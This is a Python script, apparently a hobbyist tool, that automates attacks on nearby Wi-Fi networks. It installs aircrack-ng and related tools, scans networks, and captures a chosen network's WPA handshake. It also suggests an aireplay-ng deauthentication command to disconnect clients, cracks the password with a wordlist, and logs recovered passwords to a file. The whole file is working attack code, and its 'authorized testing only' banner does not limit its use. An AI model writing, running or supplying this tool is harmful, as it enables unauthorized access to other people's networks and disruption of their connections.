#!/usr/bin/env python3

# NiiX key - WiFi Script
# Created by: cuteLiLi / techniix
# Version: beta 1.61

import subprocess
from collections import namedtuple
import os
import sys
import time
import platform
import shutil
import importlib
import tempfile
import json

# Try to import scapy at module level
try:
    from scapy.all import *
    from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# Define a named tuple to store network information
Network = namedtuple('Network', ['ssid', 'bssid', 'channel', 'signal'])

class LinuxDistroDetector:
    """Detect and handle different Linux distributions."""
    
    DISTROS = {
        'kali': {
            'name': 'Kali Linux',
            'pkg_manager': 'apt',
            'install_cmd': ['apt-get', 'install', '-y', '--allow-downgrades'],
            'update_cmd': ['apt-get', 'update'],
            'pkg_names': {
                'aircrack': 'aircrack-ng',
                'scapy': 'python3-scapy',
                'hcxtools': 'hcxtools',
                'hashcat': 'hashcat',
                'reaver': 'reaver',
                'wireless_tools': 'wireless-tools',
                'wpasupplicant': 'wpasupplicant',
                'pip': 'python3-pip',
                'iw': 'iw',
                'net_tools': 'net-tools',
                'python3_full': 'python3-full',
                'python3_venv': 'python3-venv'
            }
        },
        'ubuntu': {
            'name': 'Ubuntu',
            'pkg_manager': 'apt',
            'install_cmd': ['apt-get', 'install', '-y', '--allow-downgrades'],
            'update_cmd': ['apt-get', 'update'],
            'pkg_names': {
                'aircrack': 'aircrack-ng',
                'scapy': 'python3-scapy',
                'hcxtools': 'hcxtools',
                'hashcat': 'hashcat',
                'reaver': 'reaver',
                'wireless_tools': 'wireless-tools',
                'wpasupplicant': 'wpasupplicant',
                'pip': 'python3-pip',
                'iw': 'iw',
                'net_tools': 'net-tools',
                'python3_full': 'python3-full',
                'python3_venv': 'python3-venv',
                'python3_dev': 'python3-dev',
                'libpcap_dev': 'libpcap-dev'
            }
        },
        'debian': {
            'name': 'Debian',
            'pkg_manager': 'apt',
            'install_cmd': ['apt-get', 'install', '-y', '--allow-downgrades'],
            'update_cmd': ['apt-get', 'update'],
            'pkg_names': {
                'aircrack': 'aircrack-ng',
                'scapy': 'python3-scapy',
                'hcxtools': 'hcxtools',
                'hashcat': 'hashcat',
                'reaver': 'reaver',
                'wireless_tools': 'wireless-tools',
                'wpasupplicant': 'wpasupplicant',
                'pip': 'python3-pip',
                'iw': 'iw',
                'net_tools': 'net-tools',
                'python3_full': 'python3-full',
                'python3_venv': 'python3-venv'
            }
        },
    }
    
    @staticmethod
    def detect_distro():
        """Detect the Linux distribution."""
        try:
            # Try /etc/os-release first
            if os.path.exists('/etc/os-release'):
                with open('/etc/os-release', 'r') as f:
                    content = f.read().lower()
                    
                    # Check for specific distributions
                    if 'kali' in content:
                        return LinuxDistroDetector.DISTROS['kali']
                    elif 'ubuntu' in content:
                        # Check Ubuntu version
                        ubuntu_info = LinuxDistroDetector.DISTROS['ubuntu'].copy()
                        # Extract version for specific handling
                        for line in content.split('\n'):
                            if 'version_id' in line:
                                version = line.split('=')[1].strip('"')
                                if int(version.split('.')[0]) >= 23:
                                    # Ubuntu 23.10+ needs special handling
                                    ubuntu_info['needs_venv'] = True
                        return ubuntu_info
                    elif 'debian' in content:
                        return LinuxDistroDetector.DISTROS['debian']
            
            # Default to Ubuntu/Debian style
            return LinuxDistroDetector.DISTROS['ubuntu']
            
        except Exception as e:
            print(f"[!] Could not detect distribution: {e}")
            return LinuxDistroDetector.DISTROS['ubuntu']

def get_os():
    """Detect operating system."""
    system = platform.system()
    if system == "Linux":
        distro_info = LinuxDistroDetector.detect_distro()
        return distro_info['name']
    else:
        return "Unknown"

def check_pkg_manager(distro_info):
    """Check if package manager is available."""
    pkg_manager = distro_info['pkg_manager']
    if shutil.which(pkg_manager):
        return True
    
    alternatives = {
        'apt': ['apt-get', 'apt'],
        'pacman': ['pacman'],
        'dnf': ['dnf', 'yum'],
        'yum': ['yum', 'dnf'],
        'emerge': ['emerge'],
        'apk': ['apk'],
        'zypper': ['zypper']
    }
    
    if pkg_manager in alternatives:
        for alt in alternatives[pkg_manager]:
            if shutil.which(alt):
                distro_info['install_cmd'][0] = alt
                distro_info['update_cmd'][0] = alt
                return True
    
    return False

def run_command(cmd, show_output=True):
    """Run a command and return result."""
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=60
        )
        if show_output and result.stdout:
            print(result.stdout)
        if show_output and result.stderr:
            print(f"Stderr: {result.stderr}")
        return result.returncode == 0, result.stdout, result.stderr
    except subprocess.TimeoutExpired:
        print(f"[-] Command timed out: {' '.join(cmd)}")
        return False, "", "Timeout"
    except Exception as e:
        print(f"[-] Command error: {e}")
        return False, "", str(e)

def install_system_package(distro_info, package_key):
    """Install a system package."""
    try:
        package_name = distro_info['pkg_names'].get(package_key)
        if not package_name:
            print(f"[-] No package name for {package_key}")
            return False
        
        # Skip wireless-tools on newer systems (replaced by iw)
        if package_key == 'wireless_tools':
            print(f"[*] Skipping wireless-tools (using iw instead)")
            return True
        
        cmd = ['sudo'] + distro_info['install_cmd'] + [package_name]
        print(f"[*] Installing {package_name}...")
        
        success, stdout, stderr = run_command(cmd, show_output=False)
        
        if success:
            print(f"[+] Installed {package_name}")
            return True
        else:
            # Try alternative names for some packages
            alternatives = {
                'wireless_tools': ['wireless-tools', 'wireless_tools'],
                'wpasupplicant': ['wpasupplicant', 'wpa-supplicant'],
                'hcxtools': ['hcxtools', 'hcxtools-scripts']
            }
            
            if package_key in alternatives:
                for alt in alternatives[package_key]:
                    if alt != package_name:
                        cmd = ['sudo'] + distro_info['install_cmd'] + [alt]
                        success, stdout, stderr = run_command(cmd, show_output=False)
                        if success:
                            print(f"[+] Installed {alt} (alternative for {package_key})")
                            return True
            
            print(f"[-] Failed to install {package_name}")
            if "has no installation candidate" in stderr:
                print(f"    Package not available in repositories")
            return False
            
    except Exception as e:
        print(f"[-] Error installing {package_key}: {e}")
        return False

def install_pip_package_system(package_name):
    """Install Python package system-wide."""
    try:
        print(f"[*] Installing {package_name} via pip...")
        
        # Check for pip
        pip_cmd = None
        for cmd in ['pip3', 'pip']:
            if shutil.which(cmd):
                pip_cmd = cmd
                break
        
        if not pip_cmd:
            print("[-] pip not found")
            return False
        
        # Try with --break-system-packages for Ubuntu 23.10+
        cmd = ['sudo', pip_cmd, 'install', '--break-system-packages', package_name]
        success, stdout, stderr = run_command(cmd, show_output=False)
        
        if success:
            print(f"[+] Installed {package_name} with --break-system-packages")
            return True
        
        # Try without --break-system-packages
        cmd = ['sudo', pip_cmd, 'install', package_name]
        success, stdout, stderr = run_command(cmd, show_output=False)
        
        if success:
            print(f"[+] Installed {package_name}")
            return True
        else:
            print(f"[-] Failed to install {package_name}")
            return False
            
    except Exception as e:
        print(f"[-] Error installing via pip: {e}")
        return False

def install_scapy_system(distro_info):
    """Install scapy system-wide."""
    try:
        # First try system package
        if install_system_package(distro_info, 'scapy'):
            return True
        
        # Try pip with workarounds
        if install_pip_package_system('scapy'):
            return True
        
        # Last resort: manual download and install
        print("[*] Trying manual scapy installation...")
        
        # Download scapy
        download_cmd = ['wget', 'https://github.com/secdev/scapy/archive/refs/tags/v2.5.0.tar.gz']
        run_command(download_cmd)
        
        if os.path.exists('v2.5.0.tar.gz'):
            # Extract and install
            run_command(['tar', '-xzf', 'v2.5.0.tar.gz'])
            os.chdir('scapy-2.5.0')
            run_command(['sudo', 'python3', 'setup.py', 'install'])
            os.chdir('..')
            print("[+] Manually installed scapy")
            return True
        
        return False
        
    except Exception as e:
        print(f"[-] Error installing scapy: {e}")
        return False

def create_virtual_env():
    """Create a Python virtual environment for package installation."""
    try:
        venv_path = '/tmp/wifi_crack_venv'
        
        print(f"[*] Creating virtual environment at {venv_path}...")
        
        # Remove old venv if exists
        if os.path.exists(venv_path):
            import shutil
            shutil.rmtree(venv_path)
        
        # Create venv
        success, stdout, stderr = run_command(['python3', '-m', 'venv', venv_path])
        if not success:
            print(f"[-] Failed to create venv: {stderr}")
            return None
        
        # Get Python and pip paths
        python_path = os.path.join(venv_path, 'bin', 'python3')
        pip_path = os.path.join(venv_path, 'bin', 'pip')
        
        if not os.path.exists(python_path):
            print(f"[-] Virtual environment not created properly")
            return None
        
        print(f"[+] Virtual environment created")
        return venv_path
        
    except Exception as e:
        print(f"[-] Error creating virtual environment: {e}")
        return None

def install_in_virtual_env(venv_path, package_name):
    """Install package in virtual environment."""
    try:
        pip_path = os.path.join(venv_path, 'bin', 'pip')
        python_path = os.path.join(venv_path, 'bin', 'python3')
        
        if not os.path.exists(pip_path):
            print(f"[-] pip not found in venv")
            return False
        
        print(f"[*] Installing {package_name} in virtual environment...")
        cmd = [pip_path, 'install', package_name]
        success, stdout, stderr = run_command(cmd, show_output=False)
        
        if success:
            print(f"[+] Installed {package_name} in venv")
            return True
        else:
            print(f"[-] Failed to install {package_name} in venv")
            return False
            
    except Exception as e:
        print(f"[-] Error installing in venv: {e}")
        return False

def check_and_install_scapy(distro_info):
    """Check and install scapy with multiple methods."""
    global SCAPY_AVAILABLE
    
    try:
        # First check if already installed
        if SCAPY_AVAILABLE:
            print("[+] scapy is already installed and importable")
            return True
        
        print("[!] scapy not found or cannot be imported")
        
        # Method 1: Try system package
        print("[*] Attempt 1: Installing via system package...")
        if install_system_package(distro_info, 'scapy'):
            try:
                # Clear import cache and try again
                importlib.invalidate_caches()
                # Test if we can import scapy
                import scapy
                # Update global flag
                SCAPY_AVAILABLE = True
                print("[+] scapy installed via system package")
                return True
            except ImportError as e:
                print(f"[-] System package installed but cannot import: {e}")
        
        # Method 2: Try pip with workarounds
        print("[*] Attempt 2: Installing via pip...")
        if install_pip_package_system('scapy'):
            try:
                importlib.invalidate_caches()
                # Test if we can import scapy
                import scapy
                # Update global flag
                SCAPY_AVAILABLE = True
                print("[+] scapy installed via pip")
                return True
            except ImportError as e:
                print(f"[-] pip installed but cannot import: {e}")
        
        # Method 3: Create virtual environment
        print("[*] Attempt 3: Creating virtual environment...")
        
        # First install venv support
        install_system_package(distro_info, 'python3_venv')
        install_system_package(distro_info, 'python3_full')
        install_system_package(distro_info, 'python3_dev')
        install_system_package(distro_info, 'libpcap_dev')
        
        venv_path = create_virtual_env()
        if venv_path and install_in_virtual_env(venv_path, 'scapy'):
            # Modify sys.path to include venv
            venv_site_packages = os.path.join(venv_path, 'lib', 
                                             f'python{sys.version_info.major}.{sys.version_info.minor}', 
                                             'site-packages')
            if os.path.exists(venv_site_packages):
                sys.path.insert(0, venv_site_packages)
                try:
                    importlib.invalidate_caches()
                    # Test if we can import scapy from venv
                    import scapy
                    # Update global flag
                    SCAPY_AVAILABLE = True
                    print("[+] scapy installed in virtual environment")
                    return True
                except ImportError as e:
                    print(f"[-] Cannot import from venv: {e}")
        
        print("[-] All scapy installation methods failed")
        return False
        
    except Exception as e:
        print(f"[-] Error in scapy installation: {e}")
        return False

def check_tool(tool_name):
    """Check if a tool is available."""
    return shutil.which(tool_name) is not None

def check_all_dependencies():
    """Check if all required tools are available."""
    required_tools = [
        'airmon-ng',
        'airodump-ng',
        'aireplay-ng',
        'aircrack-ng',
        'iw',
        'hcxpcapngtool'
    ]
    
    missing_tools = []
    for tool in required_tools:
        if not check_tool(tool):
            missing_tools.append(tool)
    
    # Check for scapy
    global SCAPY_AVAILABLE
    if not SCAPY_AVAILABLE:
        missing_tools.append('scapy')
    
    if missing_tools:
        print(f"[-] Missing: {', '.join(missing_tools)}")
        return False
    
    return True

def install_dependencies():
    """Install all necessary dependencies."""
    print("[*] Installing dependencies...")
    
    # Detect distribution
    distro_info = LinuxDistroDetector.detect_distro()
    print(f"[*] Detected: {distro_info['name']}")
    
    # Check package manager
    if not check_pkg_manager(distro_info):
        print(f"[-] Package manager not found")
        return False
    
    try:
        # Update package database
        print("[*] Updating package database...")
        update_cmd = ['sudo'] + distro_info['update_cmd']
        run_command(update_cmd, show_output=False)
        
        # Essential packages that must be installed
        essential_packages = [
            'python3_full',
            'python3_venv',
            'python3_dev',
            'libpcap_dev',
            'pip',
            'iw',
            'net_tools',
            'aircrack',
            'hcxtools',
            'hashcat'
        ]
        
        # Try to install all packages
        for pkg_key in essential_packages:
            install_system_package(distro_info, pkg_key)
        
        # Optional packages (try but don't fail)
        optional_packages = ['reaver', 'wpasupplicant']
        for pkg_key in optional_packages:
            install_system_package(distro_info, pkg_key)
        
        # Install scapy (critical)
        print("\n[*] Installing scapy (this may take a moment)...")
        if not check_and_install_scapy(distro_info):
            print("\n[!] WARNING: Could not install scapy properly")
            print("[!] The script may not work without scapy")
            response = input("[?] Continue anyway? (y/n): ")
            if response.lower() != 'y':
                return False
        
        print("\n[+] Dependency installation attempt completed")
        print("[*] Checking what was installed...")
        
        # Verify installation
        verified = []
        missing = []
        
        tools_to_check = [
            ('airmon-ng', 'aircrack-ng'),
            ('airodump-ng', 'aircrack-ng'),
            ('aireplay-ng', 'aircrack-ng'),
            ('aircrack-ng', 'aircrack-ng'),
            ('hcxpcapngtool', 'hcxtools'),
            ('iw', 'iw'),
        ]
        
        for tool, package in tools_to_check:
            if check_tool(tool):
                verified.append(tool)
            else:
                missing.append(f"{tool} (from {package})")
        
        if verified:
            print(f"[+] Installed: {', '.join(verified)}")
        if missing:
            print(f"[!] Still missing: {', '.join(missing)}")
        
        # Check scapy
        global SCAPY_AVAILABLE
        if SCAPY_AVAILABLE:
            print("[+] scapy: Installed and importable")
        else:
            print("[!] scapy: Not importable")
            missing.append('scapy')
        
        if len(missing) > 3:  # If too many missing
            print("\n[-] Too many dependencies missing")
            return False
        
        return True
        
    except Exception as e:
        print(f"[-] Error installing dependencies: {e}")
        return False

def get_wireless_interfaces():
    """Get available wireless interfaces."""
    interfaces = []
    
    # Method 1: Using ip command (most reliable)
    try:
        result = subprocess.run(['ip', 'link', 'show'], 
                              capture_output=True, text=True)
        if result.returncode == 0:
            for line in result.stdout.split('\n'):
                if 'state' in line.lower():
                    parts = line.split(':')
                    if len(parts) >= 2:
                        iface = parts[1].strip()
                        # Check if it's a wireless interface
                        if iface.startswith(('wl', 'wlan', 'wlp')):
                            interfaces.append(iface)
    except:
        pass
    
    # Method 2: Using iw (if available)
    if check_tool('iw'):
        try:
            result = subprocess.run(['iw', 'dev'], 
                                  capture_output=True, text=True)
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if 'Interface' in line:
                        iface = line.split()[1]
                        if iface not in interfaces:
                            interfaces.append(iface)
        except:
            pass
    
    # Method 3: Check common interface names
    common_ifaces = ['wlan0', 'wlan1', 'wlp2s0', 'wlp3s0', 'wlx00c0ca123456']
    for iface in common_ifaces:
        if os.path.exists(f'/sys/class/net/{iface}'):
            if iface not in interfaces:
                interfaces.append(iface)
    
    return interfaces

def scan_networks(interface):
    """Scan for WiFi networks."""
    global SCAPY_AVAILABLE
    
    print(f"[*] Scanning networks on {interface}...")
    
    # Check if scapy is available
    if not SCAPY_AVAILABLE:
        print("[-] ERROR: scapy not available for scanning")
        print("[*] Trying alternative scanning method...")
        return scan_networks_alternative(interface)
    
    networks = []
    
    def packet_handler(pkt):
        if pkt.haslayer(Dot11Beacon):
            try:
                # Get SSID
                ssid = "<Hidden>"
                elt = pkt.getlayer(Dot11Elt)
                while elt:
                    if elt.ID == 0:  # SSID
                        if elt.info:
                            ssid = elt.info.decode('utf-8', errors='ignore')
                        break
                    elt = elt.payload.getlayer(Dot11Elt)
                
                # Get BSSID
                bssid = pkt.addr2
                
                # Get channel
                channel = None
                elt = pkt.getlayer(Dot11Elt)
                while elt:
                    if elt.ID == 3:  # DS Parameter (channel)
                        if elt.info:
                            channel = ord(elt.info)
                        break
                    elt = elt.payload.getlayer(Dot11Elt)
                
                # Get signal strength
                signal = -100
                if hasattr(pkt, 'dBm_AntSignal'):
                    signal = pkt.dBm_AntSignal
                
                networks.append(Network(ssid=ssid, bssid=bssid, channel=channel, signal=signal))
                
            except:
                pass
    
    try:
        # Put interface in monitor mode using airmon-ng
        print(f"[*] Putting {interface} in monitor mode...")
        subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'], 
                      capture_output=True, timeout=10)
        subprocess.run(['sudo', 'airmon-ng', 'start', interface], 
                      capture_output=True, timeout=10)
        
        monitor_iface = f"{interface}mon"
        
        # Scan
        print("[*] Scanning for networks (10 seconds)...")
        sniff(iface=monitor_iface, prn=packet_handler, timeout=10)
        
        # Stop monitor mode
        subprocess.run(['sudo', 'airmon-ng', 'stop', monitor_iface], 
                      capture_output=True, timeout=10)
        subprocess.run(['sudo', 'systemctl', 'restart', 'NetworkManager'], 
                      capture_output=True, timeout=10)
        
    except Exception as e:
        print(f"[-] Error during scan: {e}")
        # Clean up
        subprocess.run(['sudo', 'airmon-ng', 'stop', interface], 
                      capture_output=True, timeout=5)
        subprocess.run(['sudo', 'airmon-ng', 'stop', f"{interface}mon"], 
                      capture_output=True, timeout=5)
    
    # Remove duplicates and sort
    unique_nets = {}
    for net in networks:
        if net.bssid not in unique_nets or net.signal > unique_nets[net.bssid].signal:
            unique_nets[net.bssid] = net
    
    return sorted(unique_nets.values(), key=lambda x: x.signal, reverse=True)

def scan_networks_alternative(interface):
    """Alternative network scanning without scapy."""
    print("[*] Using alternative scanning method...")
    networks = []
    
    try:
        # Use iw to scan
        cmd = ['sudo', 'iw', 'dev', interface, 'scan']
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        
        if result.returncode == 0:
            lines = result.stdout.split('\n')
            current_bssid = None
            current_ssid = None
            current_signal = -100
            current_channel = None
            
            for line in lines:
                line = line.strip()
                if 'BSS' in line and '(' in line:
                    # New BSS
                    if current_bssid and current_ssid:
                        networks.append(Network(
                            ssid=current_ssid,
                            bssid=current_bssid,
                            channel=current_channel,
                            signal=current_signal
                        ))
                    
                    parts = line.split()
                    for part in parts:
                        if ':' in part and len(part) == 17:
                            current_bssid = part
                            break
                    
                    current_ssid = "<Unknown>"
                    current_signal = -100
                    current_channel = None
                
                elif 'signal:' in line.lower():
                    try:
                        # Extract signal strength
                        parts = line.split()
                        for part in parts:
                            if part.replace('.', '').replace('-', '').isdigit():
                                current_signal = int(float(part))
                                break
                    except:
                        pass
                
                elif 'DS Parameter set: channel' in line:
                    try:
                        current_channel = int(line.split(':')[1].strip())
                    except:
                        pass
                
                elif 'SSID:' in line:
                    try:
                        current_ssid = line.split(':')[1].strip()
                    except:
                        pass
            
            # Add last network
            if current_bssid and current_ssid:
                networks.append(Network(
                    ssid=current_ssid,
                    bssid=current_bssid,
                    channel=current_channel,
                    signal=current_signal
                ))
    
    except Exception as e:
        print(f"[-] Alternative scan failed: {e}")
    
    return sorted(networks, key=lambda x: x.signal, reverse=True)

def display_networks_menu(networks):
    """Display networks menu."""
    if not networks:
        print("[-] No networks found")
        return -1
    
    print("\n" + "="*60)
    print(f"Available Networks ({len(networks)} found):")
    print("="*60)
    
    for i, net in enumerate(networks[:15], 1):  # Show top 15
        ssid_display = net.ssid[:25] + "..." if len(net.ssid) > 25 else net.ssid
        ch_display = net.channel if net.channel else "?"
        print(f"{i:2}. {ssid_display:28} | {net.bssid} | Ch:{ch_display:3} | Sig:{net.signal:4}dB")
    
    print("="*60)
    
    while True:
        try:
            choice = input(f"\nSelect network (1-{min(15, len(networks))}) or 'q' to quit: ")
            if choice.lower() == 'q':
                return -1
            
            choice_num = int(choice)
            if 1 <= choice_num <= min(15, len(networks)):
                return choice_num - 1
            else:
                print(f"Enter 1-{min(15, len(networks))}")
        except ValueError:
            print("Enter a valid number")

def capture_handshake(interface, bssid, channel, ssid):
    """Capture WPA handshake."""
    print(f"\n[*] Starting handshake capture for: {ssid}")
    print(f"[*] BSSID: {bssid}")
    print(f"[*] Channel: {channel}")
    
    # Clean filename
    safe_ssid = "".join(c for c in ssid if c.isalnum() or c in (' ', '-', '_')).rstrip()
    if not safe_ssid:
        safe_ssid = "network"
    
    capture_file = f"handshake_{safe_ssid}"
    
    try:
        # Kill interfering processes
        subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'], 
                      capture_output=True, timeout=10)
        
        # Start monitor mode
        print(f"[*] Starting monitor mode on {interface}...")
        subprocess.run(['sudo', 'airmon-ng', 'start', interface], 
                      capture_output=True, timeout=10)
        
        monitor_iface = f"{interface}mon"
        
        # Start airodump-ng
        print(f"[*] Starting capture on channel {channel}...")
        cmd = [
            'sudo', 'airodump-ng',
            '--bssid', bssid,
            '--channel', str(channel),
            '-w', capture_file,
            monitor_iface
        ]
        
        airodump_proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        print(f"\n[*] Capture started. File: {capture_file}-01.cap")
        print("[*] Waiting for handshake...")
        print("[*] You can deauth clients to speed up capture:")
        print(f"    sudo aireplay-ng --deauth 10 -a {bssid} {monitor_iface}")
        print("[*] Press Ctrl+C when handshake is captured\n")
        
        # Monitor for handshake
        handshake_captured = False
        start_time = time.time()
        
        while not handshake_captured and (time.time() - start_time) < 300:
            # Check if airodump is still running
            if airodump_proc.poll() is not None:
                print("[-] airodump-ng stopped unexpectedly")
                break
            
            # Check for handshake in capture files
            for ext in ['-01.cap', '-02.cap', '-03.cap', '.cap']:
                cap_file = f"{capture_file}{ext}"
                if os.path.exists(cap_file):
                    # Check for handshake
                    check_cmd = ['aircrack-ng', cap_file]
                    result = subprocess.run(check_cmd, capture_output=True, text=True)
                    if 'WPA (1 handshake)' in result.stdout:
                        handshake_captured = True
                        print(f"[+] Handshake captured in {cap_file}!")
                        break
            
            if not handshake_captured:
                time.sleep(5)
        
        # Stop airodump
        airodump_proc.terminate()
        time.sleep(2)
        
        # Stop monitor mode
        subprocess.run(['sudo', 'airmon-ng', 'stop', monitor_iface], 
                      capture_output=True, timeout=10)
        subprocess.run(['sudo', 'systemctl', 'restart', 'NetworkManager'], 
                      capture_output=True, timeout=10)
        
        if handshake_captured:
            return capture_file
        else:
            print("[-] No handshake captured within 5 minutes")
            return None
            
    except KeyboardInterrupt:
        print("\n[*] Capture interrupted by user")
        # Clean up
        try:
            airodump_proc.terminate()
            subprocess.run(['sudo', 'airmon-ng', 'stop', f"{interface}mon"], 
                          capture_output=True, timeout=5)
            subprocess.run(['sudo', 'systemctl', 'restart', 'NetworkManager'], 
                          capture_output=True, timeout=5)
        except:
            pass
        return None
    except Exception as e:
        print(f"[-] Error during capture: {e}")
        return None

def crack_wpa_password(capture_file, bssid):
    """Crack WPA password."""
    print(f"\n[*] Starting password cracking...")
    
    # Find capture file
    cap_files = []
    for f in os.listdir('.'):
        if f.startswith(capture_file) and f.endswith('.cap'):
            cap_files.append(f)
    
    if not cap_files:
        print("[-] No capture files found")
        return None
    
    cap_file = cap_files[0]
    print(f"[*] Using capture file: {cap_file}")
    
    # Find wordlist
    wordlists = [
        '/usr/share/wordlists/rockyou.txt',
        '/usr/share/wordlists/rockyou.txt.gz',
        '/usr/share/john/password.lst',
        '/usr/share/dict/words',
        '/opt/wordlists/rockyou.txt',
        '/usr/share/wordlists/fasttrack.txt'
    ]
    
    wordlist = None
    for wl in wordlists:
        if os.path.exists(wl):
            wordlist = wl
            break
    
    if not wordlist:
        print("[-] No wordlist found. Creating a small test wordlist...")
        wordlist = '/tmp/test_passwords.txt'
        with open(wordlist, 'w') as f:
            common = [
                'password', '123456', 'admin', '12345678', 'qwerty',
                'password123', 'letmein', 'welcome', 'monkey', '123456789',
                'abc123', 'password1', '12345', '1234567', '1234567890',
                'admin123', 'wifi123', 'home123', 'office123', 'network'
            ]
            f.write('\n'.join(common))
        print(f"[*] Created test wordlist: {wordlist}")
    
    print(f"[*] Using wordlist: {wordlist}")
    print(f"[*] Starting aircrack-ng (this may take a while)...")
    
    try:
        cmd = ['aircrack-ng', '-a', '2', '-b', bssid, '-w', wordlist, cap_file]
        print(f"[*] Command: {' '.join(cmd)}")
        
        # Run aircrack-ng
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
            universal_newlines=True
        )
        
        password = None
        while True:
            output = process.stdout.readline()
            if output == '' and process.poll() is not None:
                break
            
            if output:
                print(output.strip())
                if 'KEY FOUND!' in output:
                    # Extract password
                    parts = output.split('[')
                    if len(parts) > 1:
                        password = parts[1].split(']')[0].strip()
                        break
        
        process.wait()
        
        if password:
            print(f"\n{'='*60}")
            print(f"[SUCCESS] Password found!")
            print(f"[NETWORK] {bssid}")
            print(f"[PASSWORD] {password}")
            print(f"{'='*60}")
            return password
        else:
            print(f"\n[-] Password not found in wordlist")
            return None
            
    except Exception as e:
        print(f"[-] Error during cracking: {e}")
        return None

def cleanup():
    """Cleanup resources."""
    print("\n[*] Cleaning up...")
    
    # Stop all monitor mode interfaces
    try:
        subprocess.run(['sudo', 'airmon-ng', 'stop', 'all'], 
                      capture_output=True, timeout=10)
    except:
        pass
    
    # Restart network services
    services = ['NetworkManager', 'network-manager', 'wpa_supplicant', 'networking']
    for service in services:
        try:
            subprocess.run(['sudo', 'systemctl', 'restart', service], 
                          capture_output=True, timeout=5)
        except:
            pass
    
    print("[+] Cleanup completed")

def show_banner():
    """Show tool banner."""
    banner = r"""
    ███╗   ██╗██╗██╗██╗  ██╗    ██╗    ██╗██╗███████╗██╗
    ████╗  ██║██║██║╚██╗██╔╝    ██║    ██║██║██╔════╝██║
    ██╔██╗ ██║██║██║ ╚███╔╝     ██║ █╗ ██║██║█████╗  ██║
    ██║╚██╗██║██║██║ ██╔██╗     ██║███╗██║██║██╔══╝  ██║
    ██║ ╚████║██║██║██╔╝ ██╗    ╚███╔███╔╝██║██║     ██║
    ╚═╝  ╚═══╝╚═╝╚═╝╚═╝  ╚═╝     ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝
    
    Universal WiFi Security Testing Tool v2.2
    For Educational and Authorized Testing Only
    """
    print(banner)

def main():
    """Main function."""
    # Clear screen and show banner
    os.system('clear')
    show_banner()
    
    # Check root
    if os.geteuid() != 0:
        print("[-] This tool requires root privileges!")
        print("[*] Please run: sudo python3 wifi.py")
        sys.exit(1)
    
    # Check OS
    os_name = get_os()
    print(f"[*] Operating System: {os_name}")
    
    if "Unknown" in os_name:
        print("[-] This tool only works on Linux")
        sys.exit(1)
    
    # Check dependencies
    print("\n[*] Checking dependencies...")
    if not check_all_dependencies():
        print("\n[*] Installing missing dependencies...")
        if not install_dependencies():
            print("\n[!] Some dependencies may still be missing")
            print("[!] The tool may not work properly")
            response = input("[?] Continue anyway? (y/n): ")
            if response.lower() != 'y':
                cleanup()
                sys.exit(1)
    
    print("\n[+] All checks passed!")
    
    # Get wireless interfaces
    print("\n[*] Looking for wireless interfaces...")
    interfaces = get_wireless_interfaces()
    
    if not interfaces:
        print("[-] No wireless interfaces found!")
        print("[*] Make sure:")
        print("    1. WiFi adapter is connected")
        print("    2. You have a compatible wireless card")
        print("    3. The adapter supports monitor mode")
        print("\n[*] Common compatible adapters:")
        print("    - Alfa AWUS036NHA/NH")
        print("    - Panda PAU series")
        print("    - TP-Link TL-WN722N v1")
        print("    - Cards with Atheros AR9271/RT3070/RT3572 chipsets")
        cleanup()
        sys.exit(1)
    
    print(f"[+] Found interfaces: {', '.join(interfaces)}")
    
    # Select interface
    if len(interfaces) > 1:
        print("\n[*] Multiple interfaces found:")
        for i, iface in enumerate(interfaces, 1):
            print(f"    {i}. {iface}")
        
        while True:
            try:
                choice = input(f"\nSelect interface (1-{len(interfaces)}): ")
                idx = int(choice) - 1
                if 0 <= idx < len(interfaces):
                    interface = interfaces[idx]
                    break
                else:
                    print(f"Enter 1-{len(interfaces)}")
            except ValueError:
                print("Enter a number")
    else:
        interface = interfaces[0]
        print(f"[*] Using interface: {interface}")
    
    # Scan for networks
    print(f"\n[*] Scanning for WiFi networks on {interface}...")
    print("[*] This may take 10-15 seconds...")
    
    networks = scan_networks(interface)
    
    if not networks:
        print("[-] No networks found during scan")
        print("[*] Possible reasons:")
        print("    1. No WiFi networks in range")
        print("    2. Interface doesn't support scanning")
        print("    3. Driver issues")
        cleanup()
        sys.exit(1)
    
    print(f"[+] Found {len(networks)} network(s)")
    
    # Show networks and let user select
    network_idx = display_networks_menu(networks)
    if network_idx == -1:
        print("[*] User cancelled")
        cleanup()
        sys.exit(0)
    
    selected = networks[network_idx]
    print(f"\n{'='*60}")
    print("[+] SELECTED NETWORK:")
    print(f"    SSID:    {selected.ssid}")
    print(f"    BSSID:   {selected.bssid}")
    print(f"    Channel: {selected.channel}")
    print(f"    Signal:  {selected.signal} dBm")
    print(f"{'='*60}")
    
    # Confirm selection
    confirm = input("\n[?] Proceed with this network? (y/n): ")
    if confirm.lower() != 'y':
        print("[*] Cancelled by user")
        cleanup()
        sys.exit(0)
    
    # Capture handshake
    print(f"\n{'='*60}")
    print("[*] STARTING HANDSHAKE CAPTURE")
    print(f"{'='*60}")
    
    if not selected.channel:
        selected = selected._replace(channel=1)
        print(f"[!] Channel not detected, using channel {selected.channel}")
    
    capture_file = capture_handshake(
        interface,
        selected.bssid,
        selected.channel,
        selected.ssid
    )
    
    if not capture_file:
        print("[-] Handshake capture failed")
        cleanup()
        sys.exit(1)
    
    # Crack password
    print(f"\n{'='*60}")
    print("[*] STARTING PASSWORD CRACKING")
    print(f"{'='*60}")
    
    password = crack_wpa_password(capture_file, selected.bssid)
    
    # Save results
    if password:
        # Save to file
        results_file = 'cracked_results.txt'
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        
        with open(results_file, 'a') as f:
            f.write(f"{'='*60}\n")
            f.write(f"Date: {timestamp}\n")
            f.write(f"SSID: {selected.ssid}\n")
            f.write(f"BSSID: {selected.bssid}\n")
            f.write(f"Password: {password}\n")
            f.write(f"{'='*60}\n\n")
        
        print(f"\n[+] Results saved to: {results_file}")
        
        # Show success message
        print(f"\n{'='*60}")
